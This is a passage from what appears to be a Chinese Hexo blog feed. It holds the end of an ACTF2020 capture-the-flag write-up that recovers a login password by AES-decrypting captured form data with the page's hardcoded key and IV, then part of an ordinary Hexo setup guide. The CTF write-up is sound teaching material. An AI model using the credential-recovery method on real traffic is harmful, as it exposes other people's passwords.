title="Login"></a>Login</h2><ul><li><p>题目描述：</p><blockquote><p>假装自己是一个web题目。</p><p>做完这题以后请正确加密。</p><p>格式为：afctf{xxxxxx}</p></blockquote></li><li><p>考察点：流量分析、AES加密</p></li><li><p>难度：简单</p></li><li><p>分值：200</p></li><li><p>完成人数：4</p></li></ul><p>流量分析，能提取出<code>login.html</code>的网页源码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.4.1.slim.min.js"</span> <span class="attr">integrity</span>=<span class="string">"sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8="</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">const</span> key = CryptoJS.enc.Utf8.parse(<span class="string">"1234123412ABCDEF"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">const</span> iv = CryptoJS.enc.Utf8.parse(<span class="string">'ABCDEF1234123412'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">checkform_login</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> ($(<span class="string">"#username"</span>).val() == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#username"</span>).focus();</span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">"请输入您的账号！"</span>)</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($(<span class="string">"#password"</span>).val() == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#password"</span>).focus();</span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">"请输入您的密码！"</span>)</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#u_dlcode"</span>).val(Encrypt($(<span class="string">"#username"</span>).val()))</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#p_dlcode"</span>).val(Encrypt($(<span class="string">"#password"</span>).val()))</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#form_login_true"</span>).submit();</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> <span class="literal">true</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">//加密方法</span></span></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span><span class="params">(word)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> srcs = CryptoJS.enc.Utf8.parse(word);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> encrypted = CryptoJS.AES.encrypt(srcs, key, &#123;</span></span><br><span class="line">                    iv: iv,</span><br><span class="line">                    mode: CryptoJS.mode.CBC,</span><br><span class="line">                    padding: CryptoJS.pad.Pkcs7</span><br><span class="line">                &#125;);</span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> encrypted.ciphertext.toString().toUpperCase();</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form_login"</span> <span class="attr">name</span>=<span class="string">"form_login"</span> <span class="attr">action</span>=<span class="string">"javascript:;"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">maxlength</span>=<span class="string">"20"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">id</span>=<span class="string">"dlbutton"</span> <span class="attr">value</span>=<span class="string">"登录系统"</span> <span class="attr">onclick</span>=<span class="string">"checkform_login()"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--用户输入完成后，真实POST提交的表单 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form_login_true"</span> <span class="attr">name</span>=<span class="string">"form_login_true"</span> <span class="attr">action</span>=<span class="string">"index.html"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"u_dlcode"</span> <span class="attr">id</span>=<span class="string">"u_dlcode"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"p_dlcode"</span> <span class="attr">id</span>=<span class="string">"p_dlcode"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>用户名和密码经AES加密后提交给表单，加密后的用户名为<code>u_dlcode</code>，密码为<code>p_dlcode</code>，分别能在下一个包中找到：</p><blockquote><p>key = 1234123412ABCDEF</p><p>iv = ABCDEF1234123412</p><p>u_dlcode = F6889AA527EA40FB0A2AECC5A28A694E</p><p>p_dlcode = 0D2FD588668054DA021349541E5CB64F55979D02E41C75E0CE0233F6D10E31251B40CB8E197404F9E261FBA573E09191</p><p>mode: CBC<br>padding: Pkcs7</p></blockquote><p>在这里<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">解密</a>，得到用户名为<code>admin</code>，密码即为flag：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/login/login.png" data-fancybox="group" data-caption="login" class="fancybox"><img alt="login" title="login" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/login/login.png" src="/img/loading.gif" class="lazyload"></a></p><hr><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>感谢承办单位中南大学<a href="http://www.csuaurora.org/" target="_blank" rel="noopener">极光网络安全实验室</a> </p><p>感谢以及各位出题、验题的师傅们的付出，很不错的比赛，为寒假宅在家的我增添了不少乐趣~</p><p>祝ACTF越办越好~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> writeup </tag>
            
            <tag> ROP </tag>
            
            <tag> re </tag>
            
            <tag> misc </tag>
            
            <tag> fsb </tag>
            
            <tag> crypto </tag>
            
            <tag> shellcode </tag>
            
            <tag> 栈迁移 </tag>
            
            <tag> shell基础 </tag>
            
            <tag> RSA </tag>
            
            <tag> 无符号整数 </tag>
            
            <tag> free_hook </tag>
            
            <tag> php弱类型 </tag>
            
            <tag> abs函数漏洞 </tag>
            
            <tag> _IO_FILE </tag>
            
            <tag> 逆向分析 </tag>
            
            <tag> 爆破 </tag>
            
            <tag> 动态调试 </tag>
            
            <tag> 自修改代码 </tag>
            
            <tag> 多线程 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> python </tag>
            
            <tag> githack </tag>
            
            <tag> php文件包含 </tag>
            
            <tag> HTTP协议 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> md5绕过 </tag>
            
            <tag> XXE </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 维吉尼亚密码 </tag>
            
            <tag> zip伪加密 </tag>
            
            <tag> AES </tag>
            
            <tag> base64隐写 </tag>
            
            <tag> 文件修复 </tag>
            
            <tag> 流量分析 </tag>
            
            <tag> outguess隐写 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客搭建指南</title>
      <link href="/2020/02/12/start-with-hexo/"/>
      <url>/2020/02/12/start-with-hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo简介"><a href="#Hexo简介" class="headerlink" title="Hexo简介"></a>Hexo简介</h1><p><code>Hexo</code>是一个快速、简洁且高效的静态博客框架。</p><h2 id="Hexo-vs-Wordpress"><a href="#Hexo-vs-Wordpress" class="headerlink" title="Hexo vs Wordpress"></a>Hexo vs Wordpress</h2><p>与<code>Wordpress</code>不同，<code>Hexo</code>不是一个博客系统，而是静态文章的生成工具。</p><p>二者最主要的区别便是写文章的模式不同：用<code>Wordpress</code>写文章需要在控制台操作，写完后发布出去，文章、页面等数据由<code>Wordpress</code>的后台系统管理；而用<code>Hexo</code>写文章时只需在本地操作，写好文章后，通过命令生成静态文档，然后部署到服务器即可发布文章页面。</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212135342.png" data-fancybox="group" data-caption="demo" class="fancybox"><img alt="demo" title="demo" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212135342.png" src="/img/loading.gif" class="lazyload"></a></p><p>(随便找的一个站，水墨风格，挺好看的:D)</p><h2 id="Hexo优点"><a href="#Hexo优点" class="headerlink" title="Hexo优点"></a>Hexo优点</h2><p>使用Hexo写博客的优势如下：</p><ul><li><p>博客页面可托管于<code>GitHub</code>等公共平台，无需自己购买服务器，经济实惠。</p></li><li><p><code>Hexo</code>原生<strong>支持<code>Markdown</code>语言</strong>，文章写作体验极佳，这点<code>Wordpress</code>真心比不了。</p></li><li><p><code>Hexo</code>使用<code>Node.js</code> 生成静态文档，速度极快，上百个页面能在几秒内完成渲染。</p></li><li><p>只需一条指令即可部署到 <code>GitHub Pages</code>或是自己服务器的<code>git</code>仓库</p></li></ul><p>下面介绍如何使用<code>Hexo</code>快速搭建博客~</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p><code>Hexo</code>安装时，需要从<code>github</code>和<code>npm</code>下载所需的组件，因此要先安装<code>git</code>和<code>node.js</code><br>(Node.js 版本需不低于 8.10，建议使用 Node.js 10.0 及以上版本)</p><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><ul><li><p>Windows：直接下载<a href="https://git-scm.com/download/" target="_blank" rel="noopener">git</a>安装包，点击安装即可。</p></li><li><p>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> 或者下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a>。</p></li><li><p>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></p></li><li><p>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></p></li></ul><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>Node.js 为大多数平台提供了官方的 <a href="http://nodejs.cn/download/" target="_blank" rel="noopener">安装程序</a>。</p><p>其它的安装方法：</p><ul><li>Windows：通过 <a href="https://github.com/jasongin/nvs/" target="_blank" rel="noopener">nvs</a>（推荐）或者<a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">nvm</a> 安装。</li><li>Mac：使用 <a href="https://brew.sh/" target="_blank" rel="noopener">Homebrew</a> 或 <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> 安装。</li><li>Linux（DEB/RPM-based）：从 <a href="https://github.com/nodesource/distributions" target="_blank" rel="noopener">NodeSource</a> 安装。</li></ul><p>安装完之后打开命令行，查看以下<code>nodejs</code>和<code>npm</code>的版本(<code>windows</code>下使用<code>cmd</code>执行命令)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> node -v</span></span><br><span class="line">v10.15.2</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm -v</span></span><br><span class="line">6.13.7</span><br></pre></td></tr></table></figure></div><p><code>npm</code>是随同<code>NodeJS</code>一起安装的包管理工具，如果<code>npm</code>版本较低，可使用如下命令升级：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo npm install -g npm</span></span><br></pre></td></tr></table></figure></div><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>Hexo的安装可以参考<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">官方文档</a>，文档有中文的，而且介绍的十分齐全。</p><p>所有必备的应用程序安装完成后，即可使用 <code>npm</code> 安装 Hexo：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo npm install hexo-cli -g</span></span><br></pre></td></tr></table></figure></div><h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>安装 Hexo 完成后，执行下列命令，Hexo 将会在指定文件夹中新建并自动下载所需要的文件：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo init &lt;folder&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> &lt;folder&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install</span></span><br></pre></td></tr></table></figure></div><p>新建完成后，指定文件夹的目录如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></div><h2 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h2><p><code>_config.yml</code>是网站的配置信息，可以在这里配置大部分的参数，详细介绍在<a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">这里</a></p><p>建站时，主要修改的参数有以下几个：</p><p>站点配置：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">网站标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">描述</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">关键词</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">语言</span> <span class="comment"># zh-CN</span></span><br></pre></td></tr></table></figure></div><p>URL配置：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">网站url</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span> <span class="comment"># 根目录</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span> <span class="comment"># 永久链接格式</span></span><br></pre></td></tr></table></figure></div><p>插件和主题配置：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">Butterfly</span> <span class="comment"># 主题名称(后续介绍)</span></span><br></pre></td></tr></table></figure></div><p>部署信息配置：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="comment"># 部署类型(后续介绍)</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="comment"># 仓库地址，可同时部署至多个仓库</span></span><br><span class="line">    <span class="attr">github:</span> </span><br><span class="line">    <span class="attr">mygit:</span>  </span><br><span class="line">  <span class="attr">branch:</span></span><br></pre></td></tr></table></figure></div><h2 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h2><p>应用程序的信息。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">json</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"hexo-site"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"0.0.0"</span>,</span><br><span class="line">  <span class="attr">"private"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"hexo"</span>: &#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">""</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"hexo"</span>: <span class="string">"^3.8.0"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-archive"</span>: <span class="string">"^0.1.5"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-category"</span>: <span class="string">"^0.1.3"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-index"</span>: <span class="string">"^0.2.1"</span>,</span><br><span class="line">    <span class="attr">"hexo-generator-tag"</span>: <span class="string">"^0.2.0"</span>,</span><br><span class="line">    <span class="attr">"hexo-renderer-ejs"</span>: <span class="string">"^0.3.1"</span>,</span><br><span class="line">    <span class="attr">"hexo-renderer-stylus"</span>: <span class="string">"^0.3.3"</span>,</span><br><span class="line">    <span class="attr">"hexo-renderer-marked"</span>: <span class="string">"^0.3.2"</span>,</span><br><span class="line">    <span class="attr">"hexo-server"</span>: <span class="string">"^0.3.3"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以dependencies中添加应用程序，然后在当前目录使用<code>npm</code>安装新增的应用程序：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install</span></span><br></pre></td></tr></table></figure></div><p>也可以直接用<code>npm</code>安装指定应用程序：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install &lt;pkg&gt;@&lt;version&gt; --save</span></span><br></pre></td></tr></table></figure></div><h2 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h2><p><a href="https://hexo.io/zh-cn/docs/writing" target="_blank" rel="noopener">模版</a> 文件夹。新建文章时，Hexo 会自动应用scaffold 里保存的模板文件。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── draft.md</span><br><span class="line">├── page.md</span><br><span class="line">└── post.md</span><br></pre></td></tr></table></figure></div><p>scaffolds文件夹中默认有三个模板文件，分别是草稿、页面、文章的模板。</p><p>在新建文章时，Hexo 会根据 <code>scaffolds</code> 文件夹内相对应的文件来建立文件，例如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new post  <span class="string">"New post"</span> <span class="comment"># 新建文章</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo new draft <span class="string">"New draft"</span> <span class="comment"># 新建草稿</span></span></span><br></pre></td></tr></table></figure></div><h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>资源文件夹是存放用户资源的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，其他文件则会被直接拷贝过去。（下面是我博客source文件夹的结构，后续还会介绍）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">source</span><br><span class="line">├── about</span><br><span class="line">│   └── index.md</span><br><span class="line">├── categories</span><br><span class="line">│   └── index.md</span><br><span class="line">├── _data</span><br><span class="line">│   ├── butterfly.yml</span><br><span class="line">│   └── link.yml</span><br><span class="line">├── link</span><br><span class="line">│   └── index.md</span><br><span class="line">├── _posts</span><br><span class="line">│   ├── Hello-Hexo.md</span><br><span class="line">│   └── start-with-hexo.md</span><br><span class="line">└── tags</span><br><span class="line">    └── 